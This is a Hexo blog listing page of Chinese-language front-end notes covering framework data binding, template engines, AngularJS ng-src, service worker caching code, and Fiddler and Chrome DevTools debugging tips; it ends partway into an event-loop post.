<!doctype html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">



<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">












  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">


  <meta name="keywords" content="Hexo, NexT">





  <link rel="alternate" href="/atom.xml" title="My Little World" type="application/atom+xml">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0">






<meta property="og:type" content="website">
<meta property="og:title" content="My Little World">
<meta property="og:url" content="http://yoohannah.github.io/page/14/index.html">
<meta property="og:site_name" content="My Little World">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="My Little World">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoohannah.github.io/page/14/">





  <title> My Little World </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  










  
  
    
  

  <div class="container one-collumn sidebar-position-left 
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">My Little World</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle">learn and share</p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/knowledge/render.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/knowledge/render.html" itemprop="url">
                  各种框架框架的数据绑定机制
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-21T21:30:15+08:00">
                2018-01-21
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="angular-js"><a href="#angular-js" class="headerlink" title="angular js"></a>angular js</h1><p>脏检查机制</p>
<h1 id="react"><a href="#react" class="headerlink" title="react"></a>react</h1><p>虚拟DOM:react 在初始化的时候会render一颗dom树，当state/props发生改变的时候，render函数会再渲染出另外一棵树与之前的dom树进行对比，新渲染的树就是虚拟dom树<br>diff 算法:比较dom树时的算法，</p>
<p>只会对同层节点进行比较；<br>父节点不同,不会再去比较子节点；</p>
<p>同层比较时，遇到结点类型不同,比如结点顺序发生变化时<br>没有key属性的时候，自己以及自己以后的结点都会被删除,重新建；删除时，会卸载删除的结点以及以后的结点，再新建以后的结点<br>如果有key的话，则只会新增插入的结点，卸载被替换的结点 其他结点则只是update,不受影响；删除的话，只卸载删除的结点</p>
<p>遇到结点类型相同，<br>要去比较属性是否相同，如果不同，则只替换属性,只进行update</p>
<p>性能优化：避免不必要渲染<br>使用shouldComponentUpdate(),当这个方法返回true的时候，需要重新渲染，false的时候不需要（默认是true).<br>使用PureComponent组件，它会自动浅对比props/state，当两者相同的时候不渲染节点。<br>PureComponent只会浅比较，所以不适合用于深层嵌套的对象。<br>同时，PureComponent不仅仅会跳过自己的重新渲染，还会跳过它所有子节点的，所以要注意，用它的时候是最好没有子节点并且不依赖于global state的展示型组件。<br><img src="/image/reactlife.png" alt="reactlife"></p>
<h1 id="vue1-0"><a href="#vue1-0" class="headerlink" title="vue1.0"></a>vue1.0</h1><p>单检查</p>
<h1 id="vue2-0"><a href="#vue2-0" class="headerlink" title="vue2.0"></a>vue2.0</h1><p>虚拟DOM和diff算法</p>
<p><img src="/image/vuelife.png" alt="vuelife"></p>
<h1 id="检测数据变更的4中方法"><a href="#检测数据变更的4中方法" class="headerlink" title="检测数据变更的4中方法"></a>检测数据变更的4中方法</h1><p>手动触发绑定<br>脏检查机制<br>数据对象劫持,使用Object.defineProperty<br>使用proxy</p>
<h1 id="三大框架对比"><a href="#三大框架对比" class="headerlink" title="三大框架对比"></a>三大框架对比</h1><p>1.数据检查更新原理不同<br>angularjs用脏检查<br>vue和react 使用diff算法<br>后两者效率更高</p>
<p>2.构建组件使用来说<br>angularjs更需要遵守框架规则，相对比较严谨<br>而vue次之，具备自己的响应式机制，所以要遵循一定的规则<br>最开放的是react,可以从更底层去定义自己想要的组件，<br>也可能跟react定位有关，一个用于构建UI的js库<br>它是一个库<br>库和框架的区别就是<br>库是，你调用库，作为开发者你有主动权<br>框架是你被框架调用，作为开发者你要听框架的<br>缺点就是数据改变自己要写监听逻辑</p>
<p>3.从使用场景上<br>angularjs和react都比较适合应用于大型网站开发<br>而vue小巧轻便，适合小项目开发</p>
<p>4.从学习成本上<br>vue最低，从用人角度来说最好找人<br>然后由于angular的规范严谨，导致需要学习的文档较多，<br>学习成本显而易见<br>react的开发角度相对以上两个框架更加向下，<br>有点像写早期模板语言，加上JSX语言的引入，<br>所以学习成本自然也是不低的</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/performance/template.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/performance/template.html" itemprop="url">
                  模板引擎前后端优缺点
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-04T23:03:15+08:00">
                2018-01-04
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>模板引擎在后端<br>优点<br>在第一次请求时不需要发送请求数据的的HTTP，加载速度可能会快一些；<br>利于SEO;</p>
<p>缺点<br>前端模板有改动，后端对应的模板页面也要改动；<br>如果页面有复杂JS，前端因为没有数据不方便调试，后端需要使用js进行修改；<br>服务器负载压力大</p>
<p>模板引擎在前端<br>优点<br>前后端分离，后台只需要处理逻辑业务,提供接口，减少服务端压力;<br>前端修改方便；<br>可跨平台，兼容不同后端技术</p>
<p>缺点<br>不利于SEO（搜索引擎无法抓取页面的数据，因为只是模板，没有数据内容）<br>JS有可能被用户禁用，数据安全性低</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/angular/ngsrc.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/angular/ngsrc.html" itemprop="url">
                  ng-src
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-04T22:47:15+08:00">
                2018-01-04
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="ng-src"><a href="#ng-src" class="headerlink" title="ng-src"></a>ng-src</h1><p>img 里面使用src=”{ { } }“会在页面一开始加载模板的时候，不会执行{ { } }，直接去请求资源，造成404错误<br>如果使用ng-src = “{ { } }“就会避免以上问题，ng-src会先去执行{ { } },得到资源地址后再去请求资源<br>ng-src 指令确保的 AngularJS 代码执行前不显示图片。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/performance/cache/serviceworker.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/performance/cache/serviceworker.html" itemprop="url">
                  service worker
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-03T22:52:15+08:00">
                2018-01-03
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>前端与后台代理服务器</p>
<h2 id="主要方法"><a href="#主要方法" class="headerlink" title="主要方法"></a>主要方法</h2><p>fetch 事件/方法:service worker向后台发起HTTP请求的方法<br>fetch(url).then()</p>
<p>message事件/方法:页面和service worker之间进行通信的方法;同一页面两个窗口之间通信（web worker线程)<br>postMessage发送消息;message接收消息</p>
<p>caches API:处理缓存</p>
<h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><p>注册 register<br>安装 install<br>激活 activation<br>更新 Update<br>service-worker.js文件更新被浏览器发现后，会进入waitting等待状态，当前页面依旧使用旧文件进行work，<br>直到当前页面关闭，旧版本文件的service worker才会被kill掉，新版本文件的service worker开始接管页面的缓存资源<br>新的service worker一开始接管就会触发activate事件，从而可以做一些上次老版本缓存的工作</p>
<p>缓存的文件发生更新，可以在fetch 的时候，一边检查更新从而更新缓存，一边检查缓存然后fetch新资源给浏览器，<br>通过 promise 的 resolve 特性来决定谁快</p>
<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>（https环境）<br>后台消息传递<br>网络代理，转发请求，伪造响应<br>离线缓存<br>消息推送</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">//在项目入口/配置js文件 进行注册</span><br><span class="line">if (navigator.serviceWorker) &#123;</span><br><span class="line">    navigator.serviceWorker.register(&apos;service-worker.js&apos;).then(function(registration) &#123;</span><br><span class="line">        console.log(&apos;service worker 注册成功&apos;);</span><br><span class="line">    &#125;).catch(function (err) &#123;</span><br><span class="line">        console.log(&apos;servcie worker 注册失败&apos;)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//service-worker.js 放在项目根目录下,service worker的执行代码</span><br><span class="line">var cacheFiles = [ //指定缓存的文件</span><br><span class="line">    &apos;about.js&apos;,</span><br><span class="line">    &apos;blog.js&apos;</span><br><span class="line">];</span><br><span class="line">self.addEventListener(&apos;install&apos;, function (evt) &#123; //在安装的时候就将指定文件存入cache storage中</span><br><span class="line">    evt.waitUntil(</span><br><span class="line">        caches.open(&apos;my-test-cahce-v1&apos;).then(function (cache) &#123; //使用caches api进行缓存操作</span><br><span class="line">            return cache.addAll(cacheFiles);</span><br><span class="line">        &#125;)</span><br><span class="line">    );</span><br><span class="line">&#125;);</span><br><span class="line">//页面fetch 资源时进行过滤</span><br><span class="line">self.addEventListener(&apos;fetch&apos;, function(event) &#123;</span><br><span class="line">  event.respondWith(</span><br><span class="line">    caches.match(event.request) //检查缓存是否有资源</span><br><span class="line">      .then(function(response) &#123;</span><br><span class="line">        if (response) &#123; //如果有直接返回</span><br><span class="line">          return response;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 因为 event.request 流已经在 caches.match 中使用过一次，</span><br><span class="line">        // 那么该流是不能再次使用的。我们只能得到它的副本，拿去使用。</span><br><span class="line">        var fetchRequest = event.request.clone();</span><br><span class="line"></span><br><span class="line">        // fetch 的通过信方式，得到 Request 对象，然后发送请求</span><br><span class="line">        return fetch(fetchRequest).then(</span><br><span class="line">          function(response) &#123;</span><br><span class="line">            // 检查是否成功</span><br><span class="line">            if(!response || response.status !== 200 || response.type !== &apos;basic&apos;) &#123;</span><br><span class="line">              return response;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 如果成功，该 response 一是要拿给浏览器渲染，而是要进行缓存。</span><br><span class="line">            // 由于 caches.put 使用的是文件的响应流，一旦使用，</span><br><span class="line">            // 那么返回的 response 就无法访问造成失败，所以，这里需要复制一份。</span><br><span class="line">            var responseToCache = response.clone();</span><br><span class="line"></span><br><span class="line">            caches.open(CACHE_NAME)</span><br><span class="line">              .then(function(cache) &#123;</span><br><span class="line">                cache.put(event.request, responseToCache);</span><br><span class="line">              &#125;);</span><br><span class="line"></span><br><span class="line">            return response;</span><br><span class="line">          &#125;</span><br><span class="line">        );</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">//service-worker.js文件更新删除之前版本文件缓存的资源</span><br><span class="line"></span><br><span class="line">self.addEventListener(&apos;activate&apos;, function(event) &#123;</span><br><span class="line"></span><br><span class="line">  var cacheWhitelist = [&apos;v1&apos;];</span><br><span class="line"></span><br><span class="line">  event.waitUntil(</span><br><span class="line">  // 遍历 caches 里所有缓存的 keys 值</span><br><span class="line">    caches.keys().then(function(cacheNames) &#123;</span><br><span class="line">      return Promise.all(</span><br><span class="line">        cacheNames.map(function(cacheName) &#123;</span><br><span class="line">          if (cacheWhitelist.includes(cacheName)) &#123;</span><br><span class="line">          // 删除 v1 版本缓存的文件</span><br><span class="line">            return caches.delete(cacheName);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">      );</span><br><span class="line">    &#125;)</span><br><span class="line">  );</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><a href="https://segmentfault.com/a/1190000008050742" target="_blank" rel="noopener">相关文档</a><br><a href="https://www.villainhr.com/page/2016/09/25/%E5%89%8D%E7%AB%AF%20fetch%20%E9%80%9A%E4%BF%A1" target="_blank" rel="noopener">fetch 通信</a><br><a href="https://www.villainhr.com/page/2016/08/22/Web%20Worker" target="_blank" rel="noopener">web worker 语法</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API" target="_blank" rel="noopener">Service Worker API</a></p>
<p>遗留问题：fetch通信headers添加token字段,不生效</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/test/fiddler.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/test/fiddler.html" itemprop="url">
                  调试
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-03T22:47:15+08:00">
                2018-01-03
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="fiddler-使用"><a href="#fiddler-使用" class="headerlink" title="fiddler 使用"></a>fiddler 使用</h1><p>浏览器向服务器发送请求的拦截器</p>
<h2 id="statistic"><a href="#statistic" class="headerlink" title="statistic"></a>statistic</h2><p>查看一次请求各阶段所发生的时间，HTTP performance<br><img src="/image/fiddler5.png" alt="fiddler5"></p>
<h1 id="Inspectors"><a href="#Inspectors" class="headerlink" title="Inspectors"></a>Inspectors</h1><p>查看报文，上半部分是request,下半部分是response<br><img src="/image/fiddler4.png" alt="fiddler4"></p>
<h2 id="AutoResponder"><a href="#AutoResponder" class="headerlink" title="AutoResponder"></a>AutoResponder</h2><p>拦截本来要发给真正服务器的指定请求,将本地资源作为response返回去<br><img src="/image/fiddler3.png" alt="fiddler3"><br>1.开启规则<br>2.添加规则<br>3.指定请求，若以EXACT：开头，要写完整的请求路径;模糊匹配的话就不要写EXACT：<br>4.指定作为response的本地路径资源地址<br>5.确认规则配置完毕</p>
<h2 id="composer"><a href="#composer" class="headerlink" title="composer"></a>composer</h2><p>自己创建request 向服务器发送请求<br><img src="/image/fiddler2.png" alt="fiddler2"><br>配置好request后，点击excute按钮手动向服务器发送请求</p>
<h2 id="Filters"><a href="#Filters" class="headerlink" title="Filters"></a>Filters</h2><p>只拦截指定的请求,其他请求不拦截，指定多个时用逗号隔开<br><img src="/image/fiddler1.png" alt="fiddler1"><br>填写指定请求时，编辑框为黄色，为未保存状态，点击右上角‘Changes not yet saved’确认配置完毕</p>
<h1 id="谷歌浏览器调试常用"><a href="#谷歌浏览器调试常用" class="headerlink" title="谷歌浏览器调试常用"></a>谷歌浏览器调试常用</h1><h2 id="将respose进行json格式转换"><a href="#将respose进行json格式转换" class="headerlink" title="将respose进行json格式转换"></a>将respose进行json格式转换</h2><p>1.右键接口选择copy-&gt;copy response;<br>2.在console界面执行copy()函数<br>copy(   ctrl+v    )   回车<br>3.打开编辑器，新建一个文件，ctrl+v,就得到response 的json格式<br><img src="/image/debug1.gif" alt="debug1"></p>
<h2 id="console使用"><a href="#console使用" class="headerlink" title="console使用"></a>console使用</h2><ol>
<li><p>console.table(obj):将json数据以表格形式展示在控制台<br>例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var animals = [</span><br><span class="line">    &#123; animal: &apos;Horse&apos;, name: &apos;Henry&apos;, age: 43 &#125;,</span><br><span class="line">    &#123; animal: &apos;Dog&apos;, name: &apos;Fred&apos;, age: 13 &#125;,</span><br><span class="line">    &#123; animal: &apos;Cat&apos;, name: &apos;Frodo&apos;, age: 18 &#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">console.table(animals);</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用 console.time() 和 console.timeEnd() 对循环做基准测试<br>例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">console.time(&apos;Timer1&apos;);</span><br><span class="line"></span><br><span class="line">var items = [];</span><br><span class="line"></span><br><span class="line">for(var i = 0; i &lt; 100000; i++)&#123;</span><br><span class="line">   items.push(&#123;index: i&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.timeEnd(&apos;Timer1&apos;);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>最后会得到循环所用时间<br>Timer1：xxxxx ms</p>
<ol start="3">
<li>使用console.trace 跟踪调用栈<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">var car;</span><br><span class="line">var func1 = function() &#123;</span><br><span class="line">	func2();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var func2 = function() &#123;</span><br><span class="line">	func4();</span><br><span class="line">&#125;</span><br><span class="line">var func3 = function() &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var func4 = function() &#123;</span><br><span class="line">	car = new Car();</span><br><span class="line">	car.funcX();</span><br><span class="line">&#125;</span><br><span class="line">var Car = function() &#123;</span><br><span class="line">	this.brand = &apos;volvo&apos;;</span><br><span class="line">	this.color = &apos;red&apos;;</span><br><span class="line">	this.funcX = function() &#123;</span><br><span class="line">		this.funcY();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	this.funcY = function() &#123;</span><br><span class="line">		this.funcZ();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	this.funcZ = function() &#123;</span><br><span class="line">		console.trace(&apos;trace car&apos;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">func1();</span><br><span class="line">结果如下：</span><br><span class="line">trace car</span><br><span class="line">Car.funcZ @ VM524:28</span><br><span class="line">Car.funcY @ VM524:24</span><br><span class="line">Car.funcX @ VM524:20</span><br><span class="line">func4 @ VM524:14</span><br><span class="line">func2 @ VM524:7</span><br><span class="line">func1 @ VM524:3</span><br><span class="line">(anonymous) @ VM524:31</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="调试js"><a href="#调试js" class="headerlink" title="调试js"></a>调试js</h2><p>在当前页面的js里面修改或添加代码后，ctrl+s 然后在页面触发更改的代码，即可进行调试<br>但要注意需要刷新才能执行到的代码，不能用这种方式进行调试</p>
<h2 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h2><p>直接在代码序号上进行点击即添加了断点<br>取消断点就再点击断点<br>退出断点调试就点右上角<br><img src="/image/debug2.png" alt="debug2"><br>禁用断点<br><img src="/image/debug3.png" alt="debug3"><br>如果想知道当前断点上的变量值，只需要将鼠标放在变量上即可<br><a href="https://www.zybuluo.com/lxjwlt/note/434612" target="_blank" rel="noopener">相关链接</a><br><a href="http://www.cnblogs.com/Wayou/p/chrome-console-tips-and-tricks.html" target="_blank" rel="noopener">相关链接</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/js/eventloop.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
